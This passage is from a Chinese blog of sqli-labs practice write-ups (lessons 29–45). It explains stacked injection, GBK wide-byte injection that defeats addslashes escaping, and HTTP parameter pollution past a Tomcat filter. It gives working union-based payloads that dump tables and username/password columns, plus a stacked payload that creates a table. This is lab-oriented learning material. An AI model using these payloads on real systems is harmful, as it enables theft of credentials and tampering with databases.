<p><strong>这里可能会有一个问题——union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？</strong>(1)区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是 任意的语句。 </p>
<p>(2)堆叠注入不会像联合注入那样受第一句sql语句影响。我们知道联合注入要满足第一句sql语句错误的条件下才会执行后面我们构造的sql语句，而堆叠注入没有这个问题。</p>
<p>(3)在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果时只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用 union（联合）注入。例以lesson38的一个payload为例：?id=0’ union select 1,2,database();create table test like users–+这样我们可以前台获取数据信息，后台篡改数据信息，实现“双管齐下”。</p>
<p><strong>sp：关于数据库的一些增删改查在另一篇博客已经专门介绍了，这里不多赘述。</strong></p>
<h2 id="lesson38："><a href="#lesson38：" class="headerlink" title="lesson38："></a>lesson38：</h2><p>认识一下新函数：</p>
<ul>
<li><p>mysqli_connect()函数：<br>功能：打开一个到 MySQL 服务器的新的连接。<br>语法：mysqli_connect(host,username,password,dbname,port,socket)；<img src="/.com//1.png" alt="1"></p>
</li>
<li><p>mysqli_select_db()函数：<br>作用：用于更改连接的默认数据库。<br>语法：mysqli_select_db(connection,dbname)<img src="/.com//2.png" alt="2"></p>
</li>
<li><p>mysqli_multi_query()函数：<br>语法：mysqli_multi_query(connection,query)；</p>
<p>功能：执行一个或多个针对数据库的查询。多个查询用分号进行分隔。<img src="/.com//3.jpg" alt="3"></p>
<p><strong>注：这个函数是可实现堆叠注入的重要因素！</strong></p>
</li>
<li><p>mysql_store_result()函数：<br>功能：用于将mysqli_query()查询的结果集存储到变量中</p>
</li>
<li><p>mysqli_more_results()函数：<br>语法：mysqli_more_results(connection);<br>参数：connection——必需。规定要使用的mysql连接<br>功能：检查一个多查询是否有更多的结果。</p>
</li>
<li><p>mysqli_fetch_row() 函数：</p>
<p>语法：mysqli_fetch_row(result)；</p>
<p>参数：result——必须。规定由 mysqli_query()、mysqli_store_result() 或 mysqli_use_result() 返回的结果  集标识符。</p>
<p>功能：从结果集中取得一行，并作为枚举数组返回。</p>
</li>
</ul>
<h2 id="lesson39-amp-40-amp-41："><a href="#lesson39-amp-40-amp-41：" class="headerlink" title="lesson39&amp;40&amp;41："></a>lesson39&amp;40&amp;41：</h2><p>就改变了id闭合方式，注意注入类型变化即可，其余与lesson38一致。</p>
<h2 id="lesson42："><a href="#lesson42：" class="headerlink" title="lesson42："></a>lesson42：</h2><p>这关可以用二阶注入，但是没必要，因为我们输入的密码没有被过滤，我们可以用报错注入，延时注入。或者用我们新学的堆叠注入。</p>
<p>在我们使用堆叠注入时虽然页面返回错误，但是我们在数据库中查找，还是可以看到我们的payload执行l。</p>
<h2 id="lesson43-amp-44-amp-45："><a href="#lesson43-amp-44-amp-45：" class="headerlink" title="lesson43&amp;44&amp;45："></a>lesson43&amp;44&amp;45：</h2><p>就改变了id闭合方式，注意注入类型变化即可，其余与lesson42一致。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/06/lesson38-45/" data-id="ckkv16ros00017svucytebh26" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-lesson32-37" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/06/lesson32-37/" class="article-date">
  <time datetime="2021-02-06T05:17:38.000Z" itemprop="datePublished">2021-02-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/06/lesson32-37/">lesson32-37</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="background——宽字节注入："><a href="#background——宽字节注入：" class="headerlink" title="background——宽字节注入："></a>background——宽字节注入：</h1><ul>
<li><strong>原理：</strong>mysql在使用GBK编码的时候，会认为两个字符（前一个字符的ascii码必须大于128才能到汉字的范围）。）为一个汉字，例如%aa%5c就是一个汉字。</li>
<li>以lesson32为例，查看源码发现PHP会对<code>\（反斜杠）</code>,<code>&#39;（单引号）</code>,<code>&quot;（双引号）</code>做转义处理</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          //escape any backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                               //escape single quote <span class="keyword">with</span> a backslash</span><br><span class="line">    $<span class="keyword">string</span> = preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash</span></span><br><span class="line"><span class="string">      </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    return $string;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// take the variables </span></span><br><span class="line"><span class="string">if(isset($_GET[&#x27;id&#x27;]))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">$id=check_addslashes($_GET[&#x27;id&#x27;]);</span></span><br><span class="line"><span class="string">//echo &quot;</span>The filtered request <span class="keyword">is</span> :<span class="string">&quot; .$id . &quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="string">$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span></span><br><span class="line"><span class="string">fwrite($fp,&#x27;ID:&#x27;.$id.&quot;</span>\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">fclose($fp);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// connectivity </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql_query(&quot;</span><span class="keyword">SET</span> <span class="keyword">NAMES</span> gbk<span class="string">&quot;);</span></span><br><span class="line"><span class="string">$sql=&quot;</span><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;$id&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">$result=mysql_query($sql);</span></span><br><span class="line"><span class="string">//!对于源码的解读：我认为24-26行的命令目的是将sql语句用gbk编码，以防带入数据库后乱码。</span></span><br><span class="line"><span class="string">$row = mysql_fetch_array($result);</span></span><br></pre></td></tr></table></figure>

<p>那么我们利用它会将sql语句转为gbk编码，通过吞并<code>\（url编码%5c）</code>的方式绕开其对单引号的转义。例如：%aa%5c，这在gbk编译后成为一个汉字。（gbk编码表<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php%EF%BC%89%E6%AF%94%E5%A6%82">https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php）比如</a> <code>乗</code> 字符，GBK编码 %81%5C</p>
<p><strong>补充：</strong>有些符号（<code>#</code> <code>$</code> <code>^</code> <code>&amp;</code> <code>* </code> <code>+</code> =）在URL中是不能直接传递的，如果要在URL中传递这些特殊符号，那么就要使用他们的编码了。编码的格式为：%加字符的ASCII码，即一个百分号%，后面跟对应字符的ASCII（16进制）码值。（URL编码就是在uft-8编码的基础上，给编码的每个字节加上百分号。）</p>
<h2 id="lesson32："><a href="#lesson32：" class="headerlink" title="lesson32："></a>lesson32：</h2><h3 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h3><p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,database()--+</span><br></pre></td></tr></table></figure>

<h3 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h3><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479--+</span><br></pre></td></tr></table></figure>

<p>注：爆表本应该是?id=%aa’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
<p>但是因为PHP对<code>&#39;</code>转义，那么我们可以用十六进制来表示security</p>
<h3 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h3><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;0x7365637572697479--+</span><br></pre></td></tr></table></figure>

<h3 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h3><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,group_concat(username,0x2c,password) from users--+</span><br></pre></td></tr></table></figure>

<h2 id="lesson33："><a href="#lesson33：" class="headerlink" title="lesson33："></a>lesson33：</h2><p>和lesson32一模一样。</p>
<h2 id="lesson34："><a href="#lesson34：" class="headerlink" title="lesson34："></a>lesson34：</h2><p>这关我还以为会和之前两关一样，只不过改为post类型，结果发现了一些不同。</p>
<p>当我在username输入admin%aa’ union select 1,database()#，登入失败，按理来说不应该呀。于是我用burpsuite抓包：</p>
<p><img src="/.com//1.png" alt="1"></p>
<p>我们明明输入的uname=admin%aa’ union select 1,database()#，可是我们看到多了一个<code>25</code>在%aa中间，这是什么情况呢？<strong>原来，get与post提交数据类型不同，get型如果输入符合url的格式那么就直接以url形式提交，也就是说遇到%aa这种直接当做url编码处理，而post型却不是这样，他会把你提交的%aa当做正常数据，然后进行url编码，于是就变成了%25aa。</strong></p>
<ul>
<li><p>那么我们要怎么避免这个问题呢?</p>
</li>
<li><p>我们可以用burp抓包，手动去掉<code>25</code></p>
</li>
</ul>
<p><strong>补充：不同类型编码</strong></p>
<p>UTF-16编码：一个英文字母字符或一个汉字字符存储都需要2个字节（Unicode扩展区的一些汉字存储需要4个字节）。<br>UTF-8编码：一个英文字符等于一个字节，一个中文（含繁体）等于三个字节。中文标点占三个字节，英文标点占一个字节<br>Unicode编码：一个英文等于两个字节，一个中文（含繁体）等于两个字节。中文标点占两个字节，英文标点占两个字节。</p>
<p>—）我们还可以用另外一种方式：?id=牛’ or 1=1#    </p>
<p><img src="/.com//2.png" alt="2"></p>
<p>在经过url编码后，<code>牛</code>被编码成三个字节加上单引号一个字节，再加上单引号被转义后反斜杠一个字节，总共五个字节，我们已经知道gbk编码时两个字节为一汉字，那么这样转义单引号用的反斜杠被合并，单引号“逃逸”成功。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/Unicode-UTF.php%E5%9C%A8%E7%BA%BFUnicode%E5%92%8CUTF%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E7%BD%91%E5%9D%80">https://www.qqxiuzi.cn/bianma/Unicode-UTF.php在线Unicode和UTF编码转换网址</a></li>
</ul>
<h2 id="lesson35："><a href="#lesson35：" class="headerlink" title="lesson35："></a>lesson35：</h2><p>没营养</p>
<h2 id="lesson36："><a href="#lesson36：" class="headerlink" title="lesson36："></a>lesson36：</h2><p>和lesson32一样，只不过把过滤函数改成mysql_real_escape_string（）。</p>
<h2 id="lesson37："><a href="#lesson37：" class="headerlink" title="lesson37："></a>lesson37：</h2><p>和lesson34一样，只不过把过滤函数改成mysql_real_escape_string（）。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/06/lesson32-37/" data-id="ckkttwf590000bkvu4dh9a5na" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-lesson29-31" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/05/lesson29-31/" class="article-date">
  <time datetime="2021-02-05T08:14:01.000Z" itemprop="datePublished">2021-02-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/05/lesson29-31/">lesson29-31</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="background："><a href="#background：" class="headerlink" title="background："></a>background：</h1><p>首先，我们先来了解一下什么是web应用的基本架构：</p>
<p><img src="/.com//2.png" alt="2"></p>
<p>lesson29这关中，服务端web应用有两个，一个是以tomcat为引擎的jsp型服务器，一个是以apache为引擎的php型服务器：</p>
<p><img src="/.com//1675852-20190529114341522-1690756767.png" alt="img"></p>
<p><strong>打开indexjsp查看源码：</strong></p>
<p><img src="/.com//5.png" alt="5"></p>
<p>方框内执行的是判断tomcat获取的id是否为纯数字。</p>
<p>接着，如果id是纯数字，它“确认安全”，就会把输入传递给apache服务器。</p>
<p>这过程中tomcat的作用就相当于一道waf（防火墙）。那么我们怎么绕过这个防火墙呢？</p>
<p>悉知，大多数服务器对参数的解析：</p>
<p><img src="/.com//3.png" alt="3"></p>
<p>也就是说，当遇到多个参数时，tomcat只会获取第一个参数，对其进行上述处理，只要第一个参数复合它的要求，tomcat就会把我们的输入传递到下一级。因此我们可以利用这一特点，构造多个参数来达到目的。</p>
<h1 id="lesson29："><a href="#lesson29：" class="headerlink" title="lesson29："></a>lesson29：</h1><h2 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h2><p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,database()--+</span><br></pre></td></tr></table></figure>

<h2 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h2><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure>

<h2 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h2><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure>

<h2 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h2><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure>

<h1 id="lesson30："><a href="#lesson30：" class="headerlink" title="lesson30："></a>lesson30：</h1><p>注入类型：<code>&quot;</code>  ，其余一样。</p>
<h1 id="lesson31："><a href="#lesson31：" class="headerlink" title="lesson31："></a>lesson31：</h1><p>注入类型：<code>&quot;)</code>  ，其余一样。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/05/lesson29-31/" data-id="ckkttwf5c0003bkvu18c09clw" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" rel="tag">C语言学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA-labs/" rel="tag">DVWA-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HPPT/" rel="tag">HPPT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" rel="tag">MySQL数据库的搭建与启动</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="tag">mysql数据库的使用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/upload-labs/" rel="tag">upload-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" rel="tag">数据库的增删改查</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" style="font-size: 16.67px;">C语言学习</a> <a href="/tags/DVWA-labs/" style="font-size: 10px;">DVWA-labs</a> <a href="/tags/HPPT/" style="font-size: 10px;">HPPT</a> <a href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">MySQL数据库的搭建与启动</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql数据库的使用</a> <a href="/tags/sqlilabs/" style="font-size: 20px;">sqlilabs</a> <a href="/tags/upload-labs/" style="font-size: 13.33px;">upload-labs</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 13.33px;">web渗透</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/02/28/blog/">blog</a>
          </li>
        
          <li>
            <a href="/2021/02/25/dvwa-1/">dvwa</a>
          </li>
        
          <li>
            <a href="/2021/02/20/upload-labs-pass14-21/">upload-labs-pass14-21</a>
          </li>
        
          <li>
            <a href="/2021/02/16/DVWA%E2%80%94Brute%20Force/">DVWA—Brute Force</a>
          </li>
        
          <li>
            <a href="/2021/02/09/upload-labs-pass1-13/">upload-labs-pass1—13</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>